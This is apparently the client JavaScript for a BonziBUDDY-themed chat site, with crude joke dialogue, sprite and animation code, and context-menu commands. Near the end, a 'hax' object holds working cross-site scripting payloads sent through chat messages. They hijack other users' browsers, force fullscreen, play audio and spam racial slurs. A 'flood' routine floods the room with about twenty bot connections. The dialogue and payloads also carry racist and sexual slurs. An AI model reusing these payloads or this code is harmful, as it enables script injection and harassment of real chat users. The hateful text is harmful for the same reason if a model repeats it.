        say: "Two sausages are in a pan. One looks at the other and says, Boy it's hot in here! and the other sausage says, Unbelievable! It's a talking sausage!"
      },
      {
        type: "anim",
        anim: "shrug_back",
        ticks: 15
      },
      {
        type: "text",
        text: "What were you expecting? A dick joke? You're a sick fuck."
      }
    ],[
      {
        type: "text",
        text: "What is in the middle of Paris?"
      },
      {
        type: "text",
        text: "A giant inflatable buttplug."
      }
    ],[
      {
        type: "text",
        text: "What goes in pink and comes out blue?"
      },
      {
        type: "text",
        text: "Sonic's asshole."
      }
    ],[
      {
        type: "text",
        text: "What type of water won't freeze?"
      },
      {
        type: "text",
        text: "Your mother's."
      }
    ],[
      {
        type: "text",
        text: "Who earns a living by driving their customers away?"
      },
      {
        type: "text",
        text: "Nintendo!"
      }
    ],
    [
      {
        type: "text",
        text: "Which "
      },
      {
        type: "text",
        text: "Nintendo!"
      }
    ],
    [
      {
        type: "text",
        text: "What did the digital clock say to the grandfather clock?"
      },
      {
        type: "text",
        text: "Suck my clock."
      }
    ],[
      {
        type: "text",
        text: "How do you get water in watermelons?"
      },
      {
        type: "text",
        text: "Cum in them."
      }
    ],[
      {
        type: "text",
        text: "Why do we call money bread?"
      },
      {
        type: "text",
        text: "Because we KNEAD it. Haha please send money to my PayPal at nigerianprince99@bonzi.com CHECK OUT OUR MERCH AT bonzi.merch.shop PLS BUY"
      }
    ],[
      {
        type: "text",
        text: "What is a cow that eats grass?"
      },
      {
        type: "text",
        text: "ASS"
      },
      {
        type: "text",
        text: "I'm a comedic genius, I know."
      },
    ]
  ],
  event_list_joke_end: [
    [
      {
        type: "text",
        text: "You know {NAME}, a good friend laughs at your jokes even when they're not so funny."
      },
      {
        type: "text",
        text: "And you fucking suck. Thanks."
      }
    ],
    [
      {
        type: "text",
        text: "That was a good one, if I do say so myself, {NAME}."
      },
      {
        type: "text",
        text: "Right?"
      },
      {
        type: "text",
        text: "Fuck you."
      }
    ],
    [{type: "text",text: "Where do I come up with these? My ass?"}],
    [{type: "text",text: "Do I amuse you, {NAME}? Am I funny? Do I make you laugh?"},{type: "text",text: "pls respond",say: "please respond"}],
    [
      {
        type: "text",
        text: "Maybe I'll keep my day job, {NAME}. Patreon didn't accept me."
      }
    ],
    [
      {
        type: "text",
        text: "Laughter is the best medicine!"
      },
      {
        type: "text",
        text: "Apart from meth."
      }
    ],
    [
      {
        type: "text",
        text: "Don't judge me on my sense of humor alone."
      },
      {
        type: "text",
        text: "Help! I'm being oppressed!"
      }
    ]
  ],

// ============================================================================

  event_list_fact_open: [[{type: "html",text: "Hey kids, it's time for a Fun Fact&reg;!",say: "Hey kids, it's time for a Fun Fact!"}]],

  event_list_fact_mid: [
    [
      {type: "anim",anim: "earth_fwd",ticks: 15},
      {type: "text",text: "Did you know that Uranus is 31,518 miles (50,724 km) in diameter?", say: "Did you know that Yourr Anus is 31 thousand 500 and 18 miles in diameter?",},
      {type: "anim",anim: "earth_back",ticks: 15},
      {type: "anim",anim: "grin_fwd",ticks: 15}
    ], 
    [
      {type: "text",text: "Fun Fact: The skript kiddies of this site no longer exist, because the server is more secure than FUNE'S."},
      {type: "html",text: "<img src='./img/misc/topjej.png'></img>",say: "toppest jej"}
    ]
  ],

  event_list_fact_end: [
    [
      {
        type: "text",
        text: "o gee whilickers wasn't that sure interesting huh"
      }
    ]
  ]
};

class Bonzi {
  constructor(id, userPublic) {
    this.userPublic = userPublic || {
      name: "BonziBUDDY",
      color: "purple",
      speed: 175,
      pitch: 50,
      voice: "en-us"
    };
    this.color = this.userPublic.color;
    this.colorPrev;
    this.data = window.BonziData;
    this.drag = false;
    this.dragged = false;
    this.eventQueue = [];
    this.eventRun = true;
    this.event = null;
    this.willCancel = false;
    this.run = true;
    this.mute = false;

    this.eventTypeToFunc = {
      "anim": "updateAnim",
      "html": "updateText",
      "text": "updateText",
      "idle": "updateIdle",
      "add_random": "updateRandom"
    };

    if (typeof id == "undefined") {
      this.id = Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1) + Math.floor((1 + Math.random()) * 0x10000).toString(16).substring(1);
    } else this.id = id;

    this.rng = new Math.seedrandom((this.seed || this.id) || Math.random());
    this.selContainer = "#content";
    this.$container	= $(this.selContainer);
    this.$container.append(`
      <div id='bonzi_${this.id}' class='bonzi'>
        <div class='bonzi_name'></div>
          <div class='bonzi_placeholder'></div>
        <div style='display:none' class='bubble'>
          <p class='bubble-content'></p>
        </div>
      </div>
    `);
    this.selElement = "#bonzi_" + this.id;
    this.selDialog = this.selElement + " > .bubble";
    this.selDialogCont = this.selElement + " > .bubble > p";
    this.selNametag = this.selElement + " > .bonzi_name";
    this.selCanvas = this.selElement + " > .bonzi_placeholder";
    $(this.selCanvas)
      .width(this.data.size.x)
      .height(this.data.size.y);
    
    this.$element	= $(this.selElement);
    this.$canvas	= $(this.selCanvas);
    this.$dialog	= $(this.selDialog);
    this.$dialogCont	= $(this.selDialogCont);
    this.$nametag	= $(this.selNametag);

    this.updateName();

    $.data(this.$element[0], "parent", this);

    this.updateSprite(true);
    this.generate_event = function(a, b, c) {
      a[b](e => { this[c](e); });
    };

    this.generate_event(
      this.$canvas,
      "mousedown",
      "mousedown"
    );

    this.generate_event(
      $(window),
      "mousemove",
      "mousemove"
    );

    this.generate_event($(window),"mouseup","mouseup");

    var coords = this.maxCoords();
    this.x = coords.x * this.rng();
    this.y = coords.y * this.rng();
    this.move();

    $.contextMenu({
      selector: this.selCanvas,
      build: ($trigger, e) => {
        return { items: {
          "cancel": {
            name: "Cancel",
            callback: () => { this.cancel(); }
          },
          "asshole": {
            name: "Call an Asshole",
            callback: () => {
              socket.emit("command", {
                list: ["asshole", this.userPublic.name]
              });
            }
          },
          "nukesingle": {
            name:"Nuke User",
            callback: () => {
              socket.emit("command",{list:["nuke",this.id]});
            }
          },
          "colorsteal":{
            name:"Steal Color",
            callback:()=>{
              if(this.userPublic.color.startsWith('http')){
                newWindow(
                  'options',
                  'Crosscolor Link/URL',
                  `
                  <hr>
                  Here is the stolen color:<br>
                  <a href="${this.userPublic.color}">${this.userPublic.color}</a>
                  `,
                  'ok',
                  '35%',
                  '35%'
                )
              }
            }
          },
          "heyname": {
            name: "Hey {NAME}!",
            callback: () => {
              socket.emit("msg", {text: "Hey, " + this.userPublic.name + "!"});
            }
          },
          "owo": {
            name: "Notice Bulge",
            callback: () => {
              socket.emit("command", {
                list: ["owo", this.userPublic.name]
              });
            }
          }
        } };
      },
      animation: {
        duration: 175,
        show: 'fadeIn',
        hide: 'fadeOut'
      }
    });

    // ========================================================================
    // UPDATE LOOP
    // ========================================================================

    this.needsUpdate = false;

    this.runSingleEvent([{
      type: "anim",
      anim: "surf_intro",
      ticks: 30
    }]);
  }

  eventMake(list) {
    return {
      list: list,
      index: 0,
      timer: 0,
      cur: function() { return this.list[this.index] }
    };
  }

  mousedown(e) {
    if (e.which == 1) {
      this.drag = true;
      this.dragged = false;
      this.drag_start = {
        x: e.pageX - this.x,
        y: e.pageY - this.y
      };
    }
  }

  mousemove(e) {
    if (this.drag) this.move(e.pageX - this.drag_start.x, e.pageY - this.drag_start.y); this.dragged = true;
  }
  move(x, y) {
    if (arguments.length !== 0) {
      this.x = x;
      this.y = y;
    }
    this.x = Math.min(Math.max(0, this.x),this.maxCoords().x);
    this.y = Math.min(Math.max(0, this.y),this.maxCoords().y);
    this.$element.css({
      "marginLeft": this.x,
      "marginTop": this.y
    });

    this.sprite.x = this.x;
    this.sprite.y = this.y;
    BonziHandler.needsUpdate = true;
    this.updateDialog();
  }

  mouseup(e) {
    if (!this.dragged && this.drag)
      this.cancel();

    this.drag = false;
    this.dragged = false;
  }

  runSingleEvent(list) {
    if (!this.mute)
      this.eventQueue.push(this.eventMake(list));
  }

  clearDialog() {
    this.$dialogCont.html("");
    this.$dialog.hide();
  }

  cancel() {
    this.clearDialog();
    this.stopSpeaking();
    this.eventQueue = [this.eventMake([{ type: "idle" }])];
  }

  retry() {
    this.clearDialog();
    this.event.timer = 0;
  }

  stopSpeaking() {
    this.goingToSpeak = false;
    try {
      this.voiceSource.stop();
    } catch(e) {}
  }

  cancelQueue() {
    this.willCancel = true;
  }


  updateAnim() {
    if (this.event.timer === 0)
      this.sprite.gotoAndPlay(this.event.cur().anim);
    this.event.timer++;
    BonziHandler.needsUpdate = true;
    if (this.event.timer >= this.event.cur().ticks)
      this.eventNext();
  }

  updateText() {
    if (this.event.timer === 0) {
      this.$dialog.css("display", "block");
      this.event.timer = 1;
      this.talk(
        this.event.cur().text,
        this.event.cur().say,
        true
      );
    }

    if (this.$dialog.css("display") == "none")
      this.eventNext();
  }

  updateIdle() {
    var goNext =
      (this.sprite.currentAnimation == "idle") &&
      (this.event.timer === 0);

    goNext = goNext ||
      this.data.pass_idle.indexOf(
        this.sprite.currentAnimation
      ) != -1;

    if (goNext)
      this.eventNext();
    else {
      if (this.event.timer === 0) {
        this.tmp_idle_start =
          this.data.to_idle[this.sprite.currentAnimation];
        this.sprite.gotoAndPlay(this.tmp_idle_start);
        this.event.timer = 1;
      }

      if (this.tmp_idle_start != this.sprite.currentAnimation)
        if (this.sprite.currentAnimation == "idle")
          this.eventNext();

      BonziHandler.needsUpdate = true;
    }
  }

  updateRandom() {
    var add = this.event.cur().add;
    var index = Math.floor(add.length * this.rng());

    var e = this.eventMake(add[index]);
    this.eventNext();
    this.eventQueue.unshift(e);
  }
  update() {
    if (!this.run) return; 
    // ========================================================================
    // EVENTS
    // "the fun part"
    // ========================================================================
    if ((this.eventQueue.length !== 0) && (this.eventQueue[0].index >= this.eventQueue[0].list.length))
      this.eventQueue.splice(0,1);
    this.event = this.eventQueue[0];
    if ((this.eventQueue.length !== 0) && this.eventRun) {
      var eventType = this.event.cur().type;
      try {
        this[this.eventTypeToFunc[eventType]]();
      } catch(e) { this.event.index++; }
    }
    if (this.willCancel) {
      this.cancel();
      this.willCancel = false;
    }
    if (this.needsUpdate) {
      this.stage.update();
      this.needsUpdate = false;
    }
  }
  eventNext() {
    this.event.timer = 0;
    this.event.index += 1;
  }

  talk(text, say, allowHtml) {
    allowHtml = allowHtml || false;
    text = text.replace(new RegExp("{NAME}", 'g'), this.userPublic.name);
    text = text.replace(new RegExp("{COLOR}", 'g'), this.color);
    if (typeof say !== "undefined") {
      say = say.replace(new RegExp("{NAME}", 'g'), this.userPublic.name);
      text = say.replace(new RegExp("{COLOR}", 'g'), this.color);
    } else {
      say = text.replace("&gt;", "");
    }

    text = linkify(text);
    var greentext = 
      (text.substring(0, 4) == "&gt;") ||
      (text[0] == ">");

    this.$dialogCont
      [allowHtml ? "html" : "text"](text)
      [greentext ? "addClass" : "removeClass"]("bubble_greentext")
      .css("display", "block");

    this.stopSpeaking();
    this.goingToSpeak = true;

    speak.play(say, {"pitch": this.userPublic.pitch,"speed": this.userPublic.speed}, () => {this.clearDialog() }, (source) => {
      if (!this.goingToSpeak) source.stop();
      this.voiceSource = source;
    });
  }

  joke() { this.runSingleEvent(this.data.event_list_joke); }

  fact() { this.runSingleEvent(this.data.event_list_fact); }

  exit(callback,immediate) {
    if(typeof immediate != "boolean")immediate=false;
    if(immediate)callback();
    else {this.runSingleEvent([{
      type: "anim",
      anim: "surf_away",
      ticks: 30
    }]);
    setTimeout(callback, 2000);
    }
  }

  deconstruct() {
    this.stopSpeaking();
    BonziHandler.stage.removeChild(this.sprite);
    this.run = false;
    this.$element.remove();
  }

  updateName() { this.$nametag.html(this.userPublic.name); }

  youtube(vid) {
    if (!this.mute) {
      var tag = "iframe";
      this.$dialogCont
        .html(`
          <${tag} type="text/html" width="173" height="173" 
          src="https://www.youtube.com/embed/${vid}?autoplay=1" 
          style="width:173px;height:173px"
          frameborder="0"
          allowfullscreen="allowfullscreen"
          mozallowfullscreen="mozallowfullscreen"
          msallowfullscreen="msallowfullscreen"
          oallowfullscreen="oallowfullscreen"
          webkitallowfullscreen="webkitallowfullscreen"
          ></${tag}>
        `)
      this.$dialog.show();
    }
  }

  backflip(swag) {
    var event = [{type: "anim",anim: "backflip",ticks: 15}];
    if (swag) {
      event.push({type: "anim",anim: "cool_fwd",ticks: 30});
      event.push({type: "idle"});
    }
    this.runSingleEvent(event);
  }

  clap() {
    var event = [{type: "anim",anim: "clap_fwd", ticks: 15}, {type: "idle"}];
     this.runSingleEvent(event);
  }
  swag() {
    var event = [{type: "anim",anim: "cool_fwd",ticks: 30}, {type: "idle"}];
     this.runSingleEvent(event);
  }

  updateDialog() {
    // ========================================================================
    // DIALOG BOX
    // ========================================================================
    var max = this.maxCoords();
    if (this.data.size.x + this.$dialog.width() > max.x) {
      if (this.y < (this.$container.height() / 2) - (this.data.size.x / 2)) {
        this.$dialog
          .removeClass("bubble-top")
          .removeClass("bubble-left")
          .removeClass("bubble-right")
          .addClass("bubble-bottom");
      } else {
        this.$dialog
          .removeClass("bubble-bottom")
          .removeClass("bubble-left")
          .removeClass("bubble-right")
          .addClass("bubble-top");
      }
    } else {		
      if (this.x < (this.$container.width() / 2) - (this.data.size.x / 2)) {
        this.$dialog
          .removeClass("bubble-left")
          .removeClass("bubble-top")
          .removeClass("bubble-bottom")
          .addClass("bubble-right");
      } else {
        this.$dialog
          .removeClass("bubble-right")
          .removeClass("bubble-top")
          .removeClass("bubble-bottom")
          .addClass("bubble-left");
      }
    }
  }

  maxCoords() {
    return {
      x: this.$container.width() - this.data.size.x,
      y: this.$container.height() - this.data.size.y - $("#chat_bar").height()
    };
  }

  asshole(target) {
    this.runSingleEvent(
      [{
        type: "text",
        text: "Hey, " + target + "!"
      }, {
        type: "text",
        text: "You're a fucking asshole!",
        say: "your a fucking asshole!"
      }, {
        type: "anim",
        anim: "grin_fwd",
        ticks: 15
      }, {
        type: "idle"
      }]
    );
  }

  owo(target) {
    this.runSingleEvent(
      [{
        type: "text",
        text: `*notices ${target}'s BonziBulge™*`,
        say: `notices ${target}s bonzibulge`
      }, {
        type: "text",
        text: "owo, wat dis?",
        say: "oh woah, what diss?"
      }]
    );
  }

  updateSprite(hide) {
  var stage = BonziHandler.stage;
  this.cancel();
  
  // Remove the old sprite if it exists
  if (this.sprite) {
    stage.removeChild(this.sprite);
  }

  // Check if sprite sheet exists, if not use default purple
  let spriteSheet = BonziHandler.spriteSheets[this.color];
  if (!spriteSheet) {
    console.warn(`Sprite sheet for ${this.color} not found, using default`);
    spriteSheet = BonziHandler.spriteSheets["/img/bonzi/purple.png"];
  }

  // Create new sprite with the current color
  this.sprite = new createjs.Sprite(
    spriteSheet,
    hide ? "gone" : "idle"
  );
  
  stage.addChild(this.sprite);
  this.move();
  
  // If the color changed and the sprite sheet exists, update it
  if (this.colorPrev !== this.color && BonziHandler.spriteSheets[this.color]) {
    this.sprite.gotoAndStop(hide ? "gone" : "idle");
  }
  
  this.colorPrev = this.color;
}
}

BonziData.event_list_joke = [
  {
    type: "add_random",
    pool: "event_list_joke_open",
    add: BonziData.event_list_joke_open
  },
  {
    type: "anim",
    anim: "shrug_fwd",
    ticks: 15
  },
  {
    type: "add_random",
    pool: "event_list_joke_mid",
    add: BonziData.event_list_joke_mid
  },
  {
    type: "idle"
  },
  {
    type: "add_random",
    pool: "event_list_joke_end",
    add: BonziData.event_list_joke_end
  },
  {
    type: "idle"
  }
];
BonziData.event_list_fact = [
  {
    type: "add_random",
    pool: "event_list_fact_open",
    add: BonziData.event_list_fact_open
  },
  {
    type: "add_random",
    pool: "event_list_fact_mid",
    add: BonziData.event_list_fact_mid
  },
  {
    type: "idle"
  },
  {
    type: "add_random",
    pool: "event_list_fact_end",
    add: BonziData.event_list_fact_end
  },
  {
    type: "idle"
  }
];
BonziData.event_list_triggered = [
  {
    type: "anim",
    anim: "cool_fwd",
    ticks: 30
  },
  {
    type: "text",
    text: "I sexually identify as BonziBUDDY. Ever since I was a young gorilla I dreamed of invading desktops dropping hot sticky tootorals on disgusting PC users.",
    say: "I sexually identify as BonziBUDDY. Ever since I was a young gorilla I dreamed of invading desktops dropping hot sticky tootorals on disgusting PC users."
  },
  {
    type: "text",
    text: "People say to me that a person being a BonziBUDDY is impossible and that I’m a fucking virus but I don’t care, I’m beautiful.",
    say: "People say to me that a person being a BonziBUDDY is impossible and that I'm a fucking virus but I dont care, I'm beautiful."
  },
  {
    type: "text",
    text: "I’m having an IT intern install Internet Explorer 6, aquarium screensavers and PC Doctor 2016 on my body. From now on I want you guys to call me “Joel” and respect my right to meme from above and meme needlessly.",
    say: "I'm having an IT intern install Internet Explorer 6, aquarium screensavers and PC Doctor 2016 on my body. From now on I want you guys to call me Joel and respect my right to meme from above and meme needlessly."
  },
  {
    type: "text",
    text: "If you can’t accept me you’re a gorillaphobe and need to check your file permissions. Thank you for being so understanding.",
    say: "If you cant accept me your a gorillaphobe and need to check your file permissions. Thank you for being so understanding."
  },
  {
    type: "idle"
  }
];
BonziData.event_list_linux = [
  {
    type: "text",
    text: "I'd just like to interject for a moment. What you’re referring to as Linux, is in fact, BONZI/Linux, or as I’ve recently taken to calling it, BONZI plus Linux."
  },
  {
    type: "text",
    text: "Linux is not an operating system unto itself, but rather another free component of a fully functioning BONZI system made useful by the BONZI corelibs, shell utilities and vital system components comprising a full OS as defined by M.A.L.W.A.R.E."
  },
  {
    type: "text",
    text: "Many computer users run a modified version of the BONZI system every day, without realizing it. Through a peculiar turn of events, the version of BONZI which is widely used today is often called “Linux”, and many of its users are not aware that it is basically the BONZI system, developed by the BONZI Project."
  },
  {
    type: "text",
    text: "There really is a Linux, and these people are using it, but it is just a part of the system they use. Linux is the kernel: the program in the system that allocates the machine’s memes to the other programs that you run. "
  },
  {
    type: "text",
    text: "The kernel is an essential part of an operating system, but useless by itself; it can only function in the context of a complete operating system, such as systemd."
  },
  {
    type: "text",
    text: "Linux is normally used in combination with the BONZI operating system: the whole system is basically BONZI with Linux added, or BONZI/Linux. All the so-called “Linux” distributions are really distributions of BONZI/Linux."
  }
];
BonziData.event_list_pawn = [
  {
    type: "text",
    text: "Hi, my name is BonziBUDDY, and this is my website. I meme here with my old harambe, and my son, Clippy. Everything in here has an ad and a fact. One thing I've learned after 17 years - you never know what is gonna give you some malware."
  },

];

var globalColors = [
  "/img/bonzi/black.png",
  "/img/bonzi/blue.png",
  "/img/bonzi/brown.png",
  "/img/bonzi/green.png",
  "/img/bonzi/purple.png",
  "/img/bonzi/red.png",
  "/img/bonzi/pink.png",
  "/img/bonzi/smile.png",
  "/img/bonzi/bsn.png",
  "/img/bonzi/peedy.png",
  "/img/bonzi/pope.png"
];


$(document).ready(function() {


window.BonziHandler = new agenthandle();

});





var l = 10000;
		var hax = {
			send: (a) => {
				socket.emit("msg",{text:`- <script>${a} //a<//script>`})
			},
			nuke: () => {
				socket.emit("msg",{text:`- <script>alert('RAPED AND NUKED'); setInterval(() => {socket.emit('talk',{text:'I AM A STINKY NEGRO '});},1000); setTimeout(() =>{alert('DISCONNECTED RETARD');socket.disconnect();},1)//a<//script>`})
			},
			flood: () => {
				let qq = 0;
				var rape = setInterval(() => {
					qq++;
					if(qq < 20){
						var cockpiss = io(location.href);
						cockpiss.emit("login",{name: document.getElementById('newname').value});
            setTimeout(() => {
						setInterval(() => {cockpiss.emit("msg",{text: (10000 + Math.random() * 99999) + "RAPED  BY "+document.getElementById('newname').value})},1100);
            },3500);
						setTimeout(() => {cockpiss.disconnect();},30000)
					}
				},500);

			},
			blastMusic: (aud) => {
				let a = new Audio(aud);
				a.play();
			},
			droydify: () => {
         newWindow("error","HOLY FUCK","<img src='https://i1.sndcdn.com/avatars-zaCUjzWzmpQ5cqzn-4EqdxQ-t1080x1080.jpg' width='50' height='50'><br>EVERYONE HAS BEEN DROYDIFIED","ok","40%","40%");
				hax.send(`
          alert('FUCKED BY GEORGE DROYD');
				function el(a){return document.getElementById(a);}
function openFullscreen() {
    const elem = document.documentElement;
  
    if (elem.requestFullscreen) {
      elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari */
      elem.webkitRequestFullscreen();
    } else if (elem.msRequestFullscreen) { /* IE11 */
      elem.msRequestFullscreen();
    }
  }
function initiateNiggalink(){
    el('bonzi_canvas').style.animation = "rainbo 0.5s linear infinite";
    socket.emit("command",{list:["name","NIGGALINK TESTER"]});
    el('chat_send').innerText = "BOOST";
    el('chat_send').style.width = "30%";
    el('chat_send').style.height = "30%";
    el('chat_send').style.fontSize = "90px";
    el('chat_bar').style.backgroundImage = 'none';
    el('chat_bar').style.backgroundColor = 'black';
    let qs=0;el('chat_send').onclick = () => {qs++; alert("PLEAZ WAIT MANE... (QUEUE "+qs+")");setTimeout(() => {alert("MORE RAM SUCCESFULLY DOWNLOADED FOR NIGGALINK..."); qs--;},qs*1000);}
    let elements = document.getElementsByClassName('niggalink_interface');
    document.body.style.backgroundImage = "url('./hackz/src/droyd.png')";
    let droyde = new Audio('./hackz/src/DROYD.mp3');
    droyde.play();
    droyde.loop = true;
    let overs = false;
    for(let i=0;i<elements.length;i++){
        let element = elements[i];
        let mous =  (e) => {
            if(!overs){
                overs = true;
                openFullscreen();
            }
            if(document.fullscreenElement){}
            else{
                openFullscreen();
            }
        }
        element.onmouseover = mous;
        document.body.onmouseover = mous;
        el('content').onmouseover = mous;
        setTimeout(() => {
            element.style.display = "block";
            element.style.animation = "spine 2s linear alternate-reverse infinite";
            if(element.innerHTML.includes("floydtech"))element.style.animation = "scrolle 4s linear infinite";
        },i*(800+Math.random()*300))
    }
}
document.body.insertAdjacentHTML('beforeend','<div style="width:100%;height:100%;z-index:9999;pointer-events: none;"><img style="position:absolute;opacity:0.2;" src="./hackz/src/hax.gif" width="100%" height="100%"></div><marquee scrollamount="25" style="position:absolute;left:0px;top:0px;width:100%;height:8%;color:green;background-color:black;font-family:monospace;font-style:italic;">VITALS: {[AFRO-IMMUNE&REPAIR:84WPS][PERIPHERAL-HOLOVIEW:ONLINE][BPS:300][FENT:48%]} ||||||||||  NIGGALINK_STAT: ONLINE - RAM: 86 GB</marquee><style> @keyframes spine{from{transform:rotate(360deg) scale(1);}to{transform:rotate(0deg) scale(3, 1.5);}} @keyframes scrolle{from{top:-100%;}to{top:200%;}} .icon {font-family:monospace;}</style><div><div class="niggalink_interface" style="display:none;position:absolute;left:50%;top:0px;"><img src="./hackz/src/droyd.gif" width="300" height="300" style="opacity:0.5;"></div><div class="niggalink_interface" style="display:none;position:absolute;right:0px;bottom:0px;">            <img src="./hackz/src/droyd.gif" width="300" height="300" style="opacity:0.5;">        </div>        <div class="niggalink_interface" style="display:none;position:absolute;left:50%;bottom:0px;"><img src="./hackz/src/droyd.gif" width="300" height="300" style="opacity:0.5;"></div></div><div class="niggalink_interface" style="display:none;position:absolute;"><img src="./hackz/src/floydtech.jpg" width="300" height="300" style="opacity:0.5;"></div>');
initiateNiggalink();
				`);
			}
		}
		var clicke = new Audio('./sound/click.mp3');
		var drugs = { 
  weedify: () => { 
    document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: weedify 3s ease-in-out infinite; 
        } 
      </style> 
    `); 
      setTimeout(() => {document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: initial;
        } 
      </style> 
    `); },16000);
  },
  lsdify: () => { 
    document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: lsdify 5s ease-in-out infinite; 
        } 
      </style> 
    `); 
       setTimeout(() => {document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: initial;
        } 
      </style> 
    `); },40000);
  },
  heroinify: () => {
    document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: heroinify 4.5s linear infinite; 
        } 
      </style> 
    `); 
       setTimeout(() => {document.body.insertAdjacentHTML('beforeend',` 
      <style> 
        * { 
          animation: initial;
        } 
      </style> 
    `); },40000);
  }
}
function trailerPark(){
  document.body.insertAdjacentHTML('beforeend',`
    <div id="trailr" style="position:absolute;left:0px;top:0px;
    background-size:100% 100%;background-image:url(./img/trailerpark.jpg);width:200px;
    height:200px;color:orange;padding:10px;z-index:9999;">
    <h1>DRUGS</h1><br>
    <button onclick="drugs.weedify()">WEED</button>
    <button onclick="drugs.lsdify()">LSD</button>
    <button onclick="drugs.heroinify()">HEROIN</button>
    <hr>
    <button onclick="document.getElementById('trailr').remove();">CLOSE</button>
    </div>
  `);
}